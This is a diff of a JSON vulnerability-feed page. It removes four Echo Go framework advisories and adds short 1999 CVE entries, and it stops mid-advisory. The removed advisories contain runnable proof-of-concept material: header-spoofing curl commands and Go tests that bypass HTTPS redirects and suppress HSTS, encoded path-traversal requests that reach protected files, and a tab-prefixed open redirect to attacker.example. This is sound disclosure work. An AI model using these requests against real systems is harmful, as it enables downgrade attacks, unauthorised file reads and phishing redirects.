@@ -1,949 +1,874 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-11-20",
+  "lastUpdated": "2026-11-21",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 44,
     "pageSize": 50,
     "totalPages": 288,
-    "totalItems": 14353,
+    "totalItems": 14362,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-118657",
-      "summary": "## Description\n\n`Context.Scheme()` unconditionally trusts four client-controlled HTTP headers to determine the request scheme, with no mechanism to configure trusted sources. This allows a remote unauthenticated attacker to bypass HTTPS redirect enforcement and suppress HSTS headers.\n\nThe trusted headers (checked in this order of precedence):\n1. `X-Forwarded-Proto`\n2. `X-Forwarded-Protocol`\n3. `X-Forwarded-Ssl`\n4. `X-Url-Scheme`\n\n### Threat model\n\n**Scenario A — Directly exposed application (vulnerable by default):**\nThe Echo application listens on HTTP and is reachable directly by clients (no L7 proxy in front), or an attacker can bypass the proxy and reach the backend directly. In this case, the attacker has full control over all request headers. Sending `X-Forwarded-Proto: https` defeats the `HTTPSRedirect` middleware entirely — traffic stays on plaintext HTTP, enabling man-in-the-middle attacks.\n\nThis is the primary scenario. The application is vulnerable by default with no misconfiguration required — simply using `e.Pre(middleware.HTTPSRedirect())` as documented is sufficient.\n\n**Scenario B — Behind L7 proxy with header sanitization (reduced risk):**\nIf the application is strictly behind a correctly configured L7 proxy that always overwrites `X-Forwarded-Proto` and there is no direct access to the backend, the practical risk is lower. However, this relies on perimeter controls external to the framework, not on the framework itself. As Echo's own IP-extraction documentation states: *\"you must not trust HTTP headers unconditionally.\"*\n\n### Root cause\n\n`context.go`, lines 161–181:\n\n```go\nfunc (c *Context) Scheme() string {\n    if c.IsTLS() {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != \"\" {\n        return scheme\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProtocol); scheme != \"\" {\n        return scheme\n    }\n    if ssl := c.request.Header.Get(HeaderXForwardedSsl); ssl == \"on\" {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXUrlScheme); scheme != \"\" {\n        return scheme\n    }\n    return \"http\"\n}\n```\n\nTwo additional issues with this implementation:\n\n1. **No value validation.** `Scheme()` returns any arbitrary string from the header, not just `\"http\"` or `\"https\"`. This breaks the documented contract (\"returns the HTTP protocol scheme, `http` or `https`\") and causes unexpected behavior in middleware that uses the return value to construct URLs (e.g., `WWWRedirect` builds `scheme + \"://www.\" + host + uri`).\n\n2. **Consumed by security-critical middleware.** The return value is used directly by redirect middleware (`middleware/redirect.go:136`) and secure middleware (`middleware/secure.go:125`) for security enforcement decisions.\n\n### Affected components\n\n| Component | File | Line(s) | Impact |\n|-----------|------|---------|--------|\n| `Context.Scheme()` | `context.go` | 161–181 | Returns attacker-controlled scheme |\n| `HTTPSRedirect` | `middleware/redirect.go` | 147–151 | HTTPS enforcement bypassed |\n| `HTTPSWWWRedirect` | `middleware/redirect.go` | 154–161 | HTTPS enforcement bypassed |\n| `HTTPSNonWWWRedirect` | `middleware/redirect.go` | 163–170 | HTTPS enforcement bypassed |\n| `WWWRedirect` | `middleware/redirect.go` | 172–177 | URL constructed with arbitrary scheme |\n| `NonWWWRedirect` | `middleware/redirect.go` | 179–184 | URL constructed with arbitrary scheme |\n| Secure middleware (HSTS) | `middleware/secure.go` | 125 | HSTS header suppressed |\n\n### This is an unsafe-by-default API surface, not just misconfiguration\n\nThis behavior is not accidental — it is codified in the project's own test suite. For example, `middleware/redirect_test.go` (lines 29–34) explicitly asserts that `X-Forwarded-Proto: https` on an HTTP request results in 200 OK (no redirect):\n\n```go\n{\n    whenHost:         \"labstack.com\",\n    whenHeader:       map[string][]string{echo.HeaderXForwardedProto: {\"https\"}},\n    expectLocation:   \"\",\n    expectStatusCode: http.StatusOK,\n},\n```\n\nSimilarly, `middleware/secure_test.go` (lines 42–53) and `context_test.go` (lines 1104–1111) assert that scheme is derived from the header.\n\nThe problem is not that the framework *can* use forwarded headers — that is legitimate behind a trusted proxy. The problem is that **there is no mechanism to control whether this trust is appropriate**, unlike the existing IP header trust model. `Scheme()` always trusts the headers, making any middleware that depends on it unsafe-by-default.\n\n### Inconsistency with existing trust model\n\nEcho already recognizes this class of header-trust vulnerability for IP addresses. The `IPExtractor` mechanism with `TrustOption` (`TrustLoopback`, `TrustPrivateNet`, `TrustLinkLocal`, `TrustIPRange`) was introduced specifically because:\n\n> *\"you must not trust HTTP headers unconditionally. Otherwise, you might give someone a chance of deceiving you. **A security risk!**\"*\n> — `ip.go`, lines 20–21\n\n> *\"If you put no proxy (e.g., directly facing the internet), all you need to (and have to) see is IP address from network layer. Any HTTP header is untrustable because the clients have full control what headers to be set.\"*\n> — `ip.go`, lines 36–38\n\nNo equivalent mechanism exists for scheme detection. `Scheme()` unconditionally trusts all four forwarded headers with no configuration, opt-in, or documentation warning.\n\n### Note on proxies and the \"3 additional headers\"\n\nA correctly configured nginx `proxy_set_header X-Forwarded-Proto $scheme;` overwrites `X-Forwarded-Proto` with the actual incoming scheme. When a proxy does this, `X-Forwarded-Proto` is trustworthy and the three fallback headers (`X-Forwarded-Protocol`, `X-Forwarded-Ssl`, `X-Url-Scheme`) are never reached because `X-Forwarded-Proto` takes precedence in `Scheme()`.\n\nThe three additional headers become real attack vectors specifically when:\n- The proxy does **not** set `X-Forwarded-Proto` at all (common in default proxy configs), or\n- The application is directly exposed (Scenario A above).\n\nIn such cases, an attacker can bypass via any of the four headers. The main vulnerability (HTTPS redirect bypass via `X-Forwarded-Proto` on a directly exposed app) does not depend on the additional headers.\n\n## Impact\n\n**HTTPS downgrade / MITM:** An attacker who can reach the Echo HTTP endpoint directly can prevent HTTPS redirection, keeping client traffic on plaintext HTTP and enabling man-in-the-middle attacks.\n\n**HSTS suppression:** Behind a TLS-terminating proxy, spoofing `X-Forwarded-Proto: http` prevents the `Strict-Transport-Security` header from being sent. When the response ultimately reaches the client over HTTPS (via the proxy), the missing HSTS header weakens browser-side HTTPS enforcement. Note: browsers ignore HSTS received over plain HTTP, so the practical risk is specifically in the suppression scenario behind a TLS-terminating proxy, not in injecting HSTS on HTTP.\n\n**URL construction with arbitrary scheme:** `WWWRedirect` and `NonWWWRedirect` use `c.Scheme()` to build redirect URLs (`scheme + \"://www.\" + host + uri`). An attacker can inject arbitrary strings (e.g., `javascript:`, `data:`) as the scheme component of redirect URLs.\n\n## Proof of Concept\n\nTested on Echo **v5.0.4** (commit `fa5311b`, 2026-02-15).\n\n### PoC 1: HTTPS Redirect Bypass (Go test)\n\n```go\npackage echo_test\n\nimport (\n    \"net/http\"\n    \"net/http/httptest\"\n    \"testing\"\n\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc TestHTTPSRedirectBypass(t *testing.T) {\n    e := echo.New()\n    e.Pre(middleware.HTTPSRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"served over: \"+c.Scheme())\n    })\n\n    // Normal HTTP → should redirect\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n    if rec.Code != http.StatusMovedPermanently {\n        t.Fatalf(\"expected 301, got %d\", rec.Code)\n    }\n    t.Logf(\"Normal HTTP → %d (redirect to %s)\", rec.Code, rec.Header().Get(\"Location\"))\n\n    // Attack: all 4 headers bypass the redirect\n    headers := map[string]string{\n        \"X-Forwarded-Proto\":    \"https\",\n        \"X-Forwarded-Protocol\": \"https\",\n        \"X-Forwarded-Ssl\":      \"on\",\n        \"X-Url-Scheme\":         \"https\",\n    }\n    for name, value := range headers {\n        req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n        req.Header.Set(name, value)\n        rec := httptest.NewRecorder()\n        e.ServeHTTP(rec, req)\n        if rec.Code == http.StatusOK {\n            t.Errorf(\"BYPASS via %s: %s → %d (no redirect!)\", name, value, rec.Code)\n        }\n    }\n}\n```\n\n### PoC 2: curl examples (easiest to reproduce)\n\nStart a minimal Echo server:\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    e.Pre(middleware.HTTPSRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"Hello on \"+c.Scheme())\n    })\n    e.Start(\":8080\")\n}\n```\n\nThen:\n\n```bash\n# Normal HTTP → 301 redirect (expected)\n$ curl -I http://localhost:8080/\nHTTP/1.1 301 Moved Permanently\nLocation: https://localhost:8080/\n\n# Attack: bypass via X-Forwarded-Proto\n$ curl -H \"X-Forwarded-Proto: https\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Forwarded-Protocol\n$ curl -H \"X-Forwarded-Protocol: https\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Forwarded-Ssl\n$ curl -H \"X-Forwarded-Ssl: on\" http://localhost:8080/\nHello on https\n\n# Attack: bypass via X-Url-Scheme\n$ curl -H \"X-Url-Scheme: https\" http://localhost:8080/\nHello on https\n```\n\n### PoC 3: Arbitrary scheme in redirect URL (WWWRedirect)\n\n```go\nfunc TestArbitrarySchemeInRedirect(t *testing.T) {\n    e := echo.New()\n    e.Pre(middleware.WWWRedirect())\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    })\n\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req.Host = \"example.com\"\n    req.Header.Set(\"X-Forwarded-Proto\", \"javascript\")\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n\n    // Redirect Location uses the spoofed scheme\n    loc := rec.Header().Get(\"Location\")\n    // loc == \"javascript://www.example.com/\" — violates http/https contract\n    t.Logf(\"Status: %d, Location: %s\", rec.Code, loc)\n}\n```\n\n### PoC 4: HSTS Suppression\n\n```go\nfunc TestHSTSSuppression(t *testing.T) {\n    e := echo.New()\n    e.Use(middleware.SecureWithConfig(middleware.SecureConfig{HSTSMaxAge: 31536000}))\n    e.GET(\"/\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"ok\")\n    })\n\n    // Legitimate: proxied HTTPS should have HSTS\n    req := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req.Header.Set(\"X-Forwarded-Proto\", \"https\")\n    rec := httptest.NewRecorder()\n    e.ServeHTTP(rec, req)\n    if h := rec.Header().Get(\"Strict-Transport-Security\"); h == \"\" {\n        t.Fatal(\"HSTS missing when it should be present\")\n    }\n\n    // Attack: suppress HSTS by spoofing \"http\"\n    // In production: app behind TLS-terminating proxy, proxy delivers response\n    // to client over HTTPS, but HSTS header is absent due to spoofed header\n    req2 := httptest.NewRequest(http.MethodGet, \"/\", nil)\n    req2.Header.Set(\"X-Forwarded-Proto\", \"http\")\n    rec2 := httptest.NewRecorder()\n    e.ServeHTTP(rec2, req2)\n    if h := rec2.Header().Get(\"Strict-Transport-Security\"); h == \"\" {\n        t.Error(\"VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http\")\n    }\n}\n```\n\n### Test output (all attacks succeed)\n\n```\n=== RUN   TestHTTPSRedirectBypass\n    Normal HTTP → 301 (redirect to https://example.com/)\n    BYPASS via X-Forwarded-Proto: https → 200 (no redirect!)\n    BYPASS via X-Forwarded-Protocol: https → 200 (no redirect!)\n    BYPASS via X-Forwarded-Ssl: on → 200 (no redirect!)\n    BYPASS via X-Url-Scheme: https → 200 (no redirect!)\n\n=== RUN   TestArbitrarySchemeInRedirect\n    Status: 301, Location: javascript://www.example.com/\n\n=== RUN   TestHSTSSuppression\n    VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http\n```\n\n## Precedent CVEs\n\n- **CVE-2018-1193** — Cloud Foundry GoRouter: unverified `X-Forwarded-Proto` header trusted for scheme, enabling HTTPS enforcement bypass. Fixed by adding `sanitize_forwarded_proto` option.\n- **CVE-2025-41235** — Spring Cloud Gateway: trusting forwarded headers without explicit proxy configuration, enabling HTTPS redirect bypass. Fixed by requiring trusted proxy configuration.\n\n## Suggested fix\n\n### Option A: `SchemeExtractor` (recommended, backward-compatible with opt-in)\n\nAdd a `SchemeExtractor` mechanism analogous to the existing `IPExtractor`, where the extractor decides whether to trust forwarded headers based on `RemoteAddr` or trusted proxy ranges:\n\n```go\ntype SchemeExtractor func(req *http.Request) string\n\n// ExtractSchemeDirect ignores all forwarded headers (secure default)\nfunc ExtractSchemeDirect() SchemeExtractor { ... }\n\n// ExtractSchemeFromXFFHeader trusts X-Forwarded-Proto from trusted sources\nfunc ExtractSchemeFromXFFHeader(options ...TrustOption) SchemeExtractor { ... }\n```\n\nUsage:\n\n```go\n// Secure: directly exposed, ignore headers\ne.SchemeExtractor = echo.ExtractSchemeDirect()\n\n// Behind trusted proxy\ne.SchemeExtractor = echo.ExtractSchemeFromXFFHeader(\n    echo.TrustIPRange(proxySubnet),\n)\n```\n\nThe default should be secure. For backward compatibility, a migration period with deprecation warnings for the legacy behavior may be appropriate.\n\n### Option B: Minimal hardening (does NOT fix the bypass, but fixes the contract violation)\n\n`Scheme()` should validate that the returned value is `\"http\"` or `\"https\"`, rejecting arbitrary strings. This prevents the \"arbitrary scheme in redirect URL\" issue but does not address the core HTTPS redirect bypass (because `\"https\"` is a valid value that the attacker injects).\n\n### Both options should be applied together.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. `Context.Scheme()` now uses the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme` headers only when the request comes directly from a loopback, link-local or private network address or a unix socket. When `X-Forwarded-Proto` is present, only its last value is used. The new `Echo#SchemeExtractor` selects the strategy (`ExtractSchemeFromHeaders`, `ExtractSchemeDirect`, `LegacySchemeExtractor`). The Secure middleware sets HSTS from `Context.Scheme()`, and the Proxy middleware always sets `X-Forwarded-Proto` and removes the other scheme headers.\n\n## Workarounds\n\nIf a proxy or load balancer connects to your application from a public address, trust its address ranges after upgrading, for example `e.SchemeExtractor = echo.ExtractSchemeFromHeaders(echo.TrustIPRange(proxyRange))`; otherwise `HTTPSRedirect` redirects in a loop. If you cannot upgrade, make sure every request passes through a proxy that overwrites `X-Forwarded-Proto` and removes `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme`, and that the application cannot be reached directly.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-346",
-        "name": "Origin Validation Error"
-      },
+      "id": "CVE-1999-0397",
+      "summary": "The demo version of the Quakenbush NT Password Appraiser sends passwords across the network in plaintext.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-01-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/labstack/echo/security/advisories/GHSA-2ffq-g2xg-c22p",
-        "https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1",
-        "https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af",
-        "https://github.com/labstack/echo/releases/tag/v4.16.0",
-        "https://github.com/labstack/echo/releases/tag/v5.4.0"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0397",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0397"
       ],
-      "vulnerableProducts": [
-        "github.com/labstack/echo/v5 go",
-        "github.com/labstack/echo/v4 go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-118654",
-      "summary": "## Summary\n\nEcho v5.2.0 contains a bypass of the fix for GHSA-vfp3-v2gw-7wfq. The fix rejects encoded path separators such as `%2F` and `%5C` before static file path unescaping, but two traversal forms still bypass route-level middleware protections for static files.\n\nThe primary bypass uses encoded dot-dot segments. A request such as `/public/%2E%2E/admin/secret.txt` passes the encoded-separator guard, is unescaped to `public/../admin/secret.txt`, then `path.Clean` resolves it to `admin/secret.txt`. If `/admin/*` is protected by middleware but the static filesystem is mounted at `/`, the protected file is returned through the public static route.\n\nA second bypass exists when `UseEscapedPathForMatching=true`. In that mode, the router normalizes encoded separators before the static handler checks the wildcard. The handler receives a decoded wildcard with no `%` characters, so the encoded-separator guard does not run on the original encoded path.\n\n## Impact\n\nAn unauthenticated attacker can read files that an application intended to protect with route-level middleware, when those files are also reachable through a static filesystem mount after path normalization.\n\nThe high-severity variant works with the default router configuration and requires only encoded dot-dot path segments. The direct protected route returns 403, while the public static route returns the protected file content.\n\nThe `UseEscapedPathForMatching=true` variant is lower severity because it requires a non-default router configuration.\n\n## Affected versions\n\nTested vulnerable:\n\n- `github.com/labstack/echo/v5` v5.2.0\n- Current `master` at `5786024ea4d85c01784796e8aa7aac53e007b39b`\n\nNo patched version is currently known.\n\n## Policy and version checks\n\nGitHub Private Vulnerability Reporting is enabled for `labstack/echo`. The repository has a root `SECURITY.md` and accepts security reports through GitHub Security Advisories.\n\nThe vulnerable code was revalidated on both current `master` and the latest release tag:\n\n- Current `master`: `5786024ea4d85c01784796e8aa7aac53e007b39b`\n- Latest release: `v5.2.0`, published June 14 2026\n- Package: `github.com/labstack/echo/v5`\n\nThe same focused Go tests pass on the checked out `v5.2.0` / `master` commit, proving the bypass remains present in the latest released version and latest main branch at the time of reporting.\n\n## Reproduction\n\nThe following application shape reproduces the high-severity bypass:\n\n```go\ne := echo.New()\n\ng := e.Group(\"/admin\", func(next echo.HandlerFunc) echo.HandlerFunc {\n    return func(c echo.Context) error {\n        return echo.NewHTTPError(http.StatusForbidden)\n    }\n})\ng.GET(\"/*\", handler)\n\ne.StaticFS(\"/\", fsysWithAdminSecret)\n```\n\nControl request:\n\n```http\nGET /admin/secret.txt\n```\n\nObserved result:\n\n```text\n403 Forbidden\n```\n\nBypass request:\n\n```http\nGET /public/%2E%2E/admin/secret.txt\n```\n\nObserved result:\n\n```text\n200 OK\nTOP-SECRET\n```\n\nFor the non-default router variant:\n\n```go\ne := echo.New()\ne.router = echo.NewRouter(echo.RouterConfig{\n    UseEscapedPathForMatching: true,\n})\n\ng := e.Group(\"/admin\", authMiddlewareReturning403)\ng.GET(\"/*\", handler)\n\ne.StaticFS(\"/\", fsysWithAdminSecret)\n```\n\nBypass request:\n\n```http\nGET /public%2F..%2Fadmin%2Fsecret.txt\n```\n\nObserved result:\n\n```text\n200 OK\nTOP-SECRET\n```\n\n## Proof of concept evidence\n\nI added focused tests against the current Echo codebase. The tests exercise both `StaticDirectoryHandler` and the static middleware path.\n\nCommand:\n\n```bash\ngo test -run TestHostile -v ./...\n```\n\nObserved result:\n\n```text\n=== RUN   TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked\nPASS: TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked (0.00s)\n=== RUN   TestHostile_StaticDirectoryHandler_EncodedDotDotBypass\nPASS: TestHostile_StaticDirectoryHandler_EncodedDotDotBypass (0.00s)\n=== RUN   TestHostile_UseEscapedPathForMatching_Bypass\nPASS: TestHostile_UseEscapedPathForMatching_Bypass (0.00s)\nPASS\nok  github.com/labstack/echo/v5  0.013s\n=== RUN   TestHostile_StaticMiddleware_EncodedSeparatorsBlocked\nPASS: TestHostile_StaticMiddleware_EncodedSeparatorsBlocked (0.01s)\n=== RUN   TestHostile_StaticMiddleware_EncodedDotDotBypass\nPASS: TestHostile_StaticMiddleware_EncodedDotDotBypass (0.00s)\n=== RUN   TestHostile_StaticMiddleware_DisablePathUnescaping\nPASS: TestHostile_StaticMiddleware_DisablePathUnescaping (0.00s)\nPASS\nok  github.com/labstack/echo/v5/middleware  0.012s\n```\n\nThe control tests also confirm that the new fix blocks encoded separators such as `%2F`, `%5C`, double-encoded slash values, null bytes, and overlong slash encodings.\n\n## Root cause\n\nThe fix for GHSA-vfp3 uses a denylist-style guard that checks for encoded path separators before unescaping the static wildcard. This blocks `%2F` and `%5C`, but does not block encoded traversal segments such as `%2E%2E`.\n\nThe vulnerable flow is:\n\n1. The static route wildcard accepts `public/%2E%2E/admin/secret.txt`.\n2. The encoded-separator guard sees no `%2F` or `%5C` and allows the request.\n3. The handler unescapes the wildcard to `public/../admin/secret.txt`.\n4. `path.Clean` resolves it to `admin/secret.txt`.\n5. The file is served through the public static route instead of the protected `/admin/*` route.\n\nFor `UseEscapedPathForMatching=true`, the router decodes the path before the static handler sees the wildcard, so the handler cannot detect that encoded separators were used in the original request.\n\n## Remediation\n\nDo not rely only on detecting encoded separators. Reject encoded traversal sequences before unescaping, and reject normalized wildcard values that cross route or static mount boundaries.\n\nPossible fixes:\n\n1. Extend the pre-unescape guard to reject encoded dot segments such as `%2E` and `%2E%2E` in path components.\n2. After unescaping, reject any wildcard where cleaning changes the path in a way that removes `.` or `..` components.\n3. For `UseEscapedPathForMatching=true`, run the static-file guard against the original escaped request path before router normalization, or preserve metadata that the matched wildcard came from encoded separators.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The Static middleware and `StaticDirectoryHandler` (used by `Echo.Static`, `Echo.StaticFS`, `Group.Static` and `Group.StaticFS`) no longer serve paths with a `.`, `..` or empty segment, including after path unescaping. The encoded variant of the first vector (`/public/%2E%2E/admin/secret.txt`) was already fixed in v5.2.1 and v4.15.4 (GHSA-vfp3-v2gw-7wfq).\n\n## Workarounds\n\nPut a reverse proxy in front of the application that normalizes request paths (removes dot segments and merges slashes), or keep protected files outside the served directory.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-22",
-        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
-      },
+      "id": "CVE-1999-0452",
+      "summary": "A service or application has a backdoor password that was placed there by the developer.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-01-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/labstack/echo/security/advisories/GHSA-3pmx-cf9f-34xr",
-        "https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1",
-        "https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af",
-        "https://github.com/labstack/echo/releases/tag/v4.16.0",
-        "https://github.com/labstack/echo/releases/tag/v5.4.0"
+        "https://www.cve.org/CVERecord?id=CVE-1999-0452",
+        "https://www.cve.org/CVERecord?id=CVE-1999-0452"
       ],
-      "vulnerableProducts": [
-        "github.com/labstack/echo/v5 go",
-        "github.com/labstack/echo/v4 go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-118655",
-      "summary": "## Summary\n\nCommit a9ede66a (PR #3006, issue #2599) silently fixed a path traversal vulnerability in the Echo web framework's static file middleware.\n\n## Vulnerability\n\nThe static middleware double-unescaped URL paths. Go's net/http already decodes Request.URL.Path, but middleware/static.go unconditionally called url.PathUnescape() again:\n\n```go\n// BEFORE (vulnerable)\npathUnescape := true\n```\n\nThis reassembled path traversal sequences from double-encoded input. An attacker could send GET /%2e%2e%2fsecret.txt or /..%252fsecret.txt and the double-unescape would produce ../secret.txt.\n\n## Fix\n```go\n// AFTER (fixed)\npathUnescape := false\n```\n\nThe commit's test TestStatic_percentEncodedTraversalIsBlocked explicitly verifies traversal vectors are blocked.\n\n## Impact\nArbitrary file read from server filesystem via percent-encoded path traversal.\n\n## References\n- Fix: https://github.com/labstack/echo/commit/a9ede66a\n- Issue: https://github.com/labstack/echo/issues/2599\n- PR: https://github.com/labstack/echo/pull/3006\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.2.0 and `github.com/labstack/echo/v4` v4.15.3, where the Static middleware stopped unescaping an already decoded path. Maintainer analysis: reading files outside the configured root could not be reproduced; the confirmed impact was that a double-encoded slash (`%252F`) could reach a file under a guarded route when the Static middleware is registered globally. Upgrade to v5.4.0 / v4.16.0 or later, which also includes related fixes for encoded and dot-segment paths.\n\n## Workarounds\n\nKeep files that need protection outside the Static middleware's root directory.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-174",
-        "name": "Double Decoding of the Same Data"
-      },
+      "id": "CVE-1999-0454",
+      "summary": "A remote attacker can sometimes identify the operating system of a host based on how it reacts to some IP or ICMP packets, using a tool such as nmap or queso.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-01-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/labstack/echo/security/advisories/GHSA-xwq5-6cqp-vx96",
-        "https://github.com/labstack/echo/issues/2599",
-        "https://github.com/labstack/echo/pull/3006",
-        "https://github.com/labstack/echo/commit/a9ede66a5a7196411131beb1ee801e75bbaf7ac6",
-        "https://github.com/labstack/echo/commit/c3fa2a27ff92b2b8db360de614f999ef1da24725"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2048",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2048"
       ],
-      "vulnerableProducts": [
-        "github.com/labstack/echo/v5 go",
-        "github.com/labstack/echo/v4 go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-118656",
-      "summary": "## Summary\n\nEcho's dedicated open-redirect guard, `sanitizeURI`, decides whether a redirect target is a local path by inspecting exactly two byte positions: `uri[0]` and `uri[1]`. If the value begins with a control character such as a tab or a newline, followed by a separator pair, the guard does not fire and the value is written to the `Location` header unchanged.\n\nBrowsers remove tab and newline characters from URLs before parsing them, and treat a backslash as a forward slash for HTTP and HTTPS URLs. A `Location` value of ``/\\t/attacker.example`` is therefore resolved by the browser as an absolute URL on `attacker.example`. Confirmed end to end in a headless browser.\n\n## Technical background\n\n### The guard\n\n`middleware/slash.go:144` (duplicated verbatim at `echo.go:958`):\n\n```go\nfunc sanitizeURI(uri string) string {\n\t// double slash `\\\\`, `//` or even `\\/` is absolute uri for browsers and by redirecting request to that uri\n\t// we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash\n\tif len(uri) > 1 && (uri[0] == '\\\\' || uri[0] == '/') && (uri[1] == '\\\\' || uri[1] == '/') {\n\t\turi = \"/\" + strings.TrimLeft(uri, `/\\`)\n\t}\n\treturn uri\n}\n```\n\nThe condition is anchored at absolute offsets 0 and 1. It cannot see a separator that has been shifted by one byte.\n\n### Data flow\n\n1. `RemoveTrailingSlash` (`middleware/slash.go:112-140`) reads `url.Path`, which `net/http` has already percent-decoded, strips the trailing slash, and appends the raw query string:\n\n```go\npath := url.Path\n...\nif l > 0 && strings.HasSuffix(path, \"/\") {\n    path = path[:l]\n    uri := path\n    if qs != \"\" {\n        uri += \"?\" + qs\n    }\n    if config.RedirectCode != 0 {\n        return c.Redirect(config.RedirectCode, sanitizeURI(uri))   // line 132\n    }\n```\n\n2. `AddTrailingSlash` does the same in the opposite direction at `middleware/slash.go:67`.\n\n3. A request for `/%09/attacker.example/x/` has `url.Path` equal to `\"/\\t/attacker.example/x/\"` (a literal TAB byte). `sanitizeURI` evaluates `uri[0] == '\\t'`, the condition is false, and the value passes through untouched.\n\n4. `Context.Redirect` (`context.go:735`) writes it to the `Location` header. Go's header writer removes CR and LF but leaves TAB, which is all that is required.\n\n### Conditional analysis\n\n- Guard: `uri[0]` and `uri[1]` are separators. Trust boundary: server-side sanitization of attacker-influenced path data.\n- Bypass: place a single control byte before the separator pair. The separator moves to index 1 and the guard's second condition (`uri[1]` being a separator) is never reached because the first condition (`uri[0]` being a separator) already failed.\n- Browser-side trust boundary: the client's URL parser. It is adversary favourable: control characters are stripped and backslashes are normalized before scheme and authority parsing. The attacker does not need any server-side weakness beyond producing the malformed `Location`.\n\nNote that the newline variant does not survive: `net/http` replaces CR and LF in header values. TAB does survive, and TAB alone is sufficient because the browser strips it.\n\n## Proof of concept\n\n**Attached PoC:** `ECHO-2026-002_poc.zip` (in this directory). Extract it and follow\n`ECHO-2026-002/README.md` for the full walkthrough. The archive contains a\nself-contained Go module (`go.mod`, `go.sum`, `main.go`, `README.md`).\n\n[ECHO-2026-002_poc.zip](https://github.com/user-attachments/files/32133975/ECHO-2026-002_poc.zip)\n\nQuick start:\n\n```bash\nunzip ECHO-2026-002_poc.zip\ncd ECHO-2026-002\n# edit go.mod: point the replace directive at your Echo checkout\nsed -i 's|=> .*|=> /absolute/path/to/echo|' go.mod\nGOFLAGS=-mod=mod go run .          # in-process check\nGOFLAGS=-mod=mod go run . -serve   # real listener on 127.0.0.1:18002\n```\n\n### Environment used for verification\n\n- OS: Linux 6.18.33.2-microsoft-standard-WSL2, x86_64\n- Go: go1.27.0 linux/amd64\n- Target: Echo v5.3.1 (module `github.com/labstack/echo/v5`)\n- Browser: headless Chromium drove the end-to-end confirmation\n\n### The vulnerable configuration\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    e.Pre(middleware.RemoveTrailingSlashWithConfig(middleware.RemoveTrailingSlashConfig{\n        RedirectCode: http.StatusMovedPermanently,\n    }))\n    e.GET(\"/\", func(c *echo.Context) error { return c.String(200, \"home\") })\n    _ = e.Start(\"127.0.0.1:18002\")\n}\n```\n\n***\n\n### Reproduction\n\nIn-process check. The program requests five path shapes and applies the browser\nURL-parsing steps that matter (strip TAB, LF, CR; treat a backslash as a slash; a\nleading `//` starts an 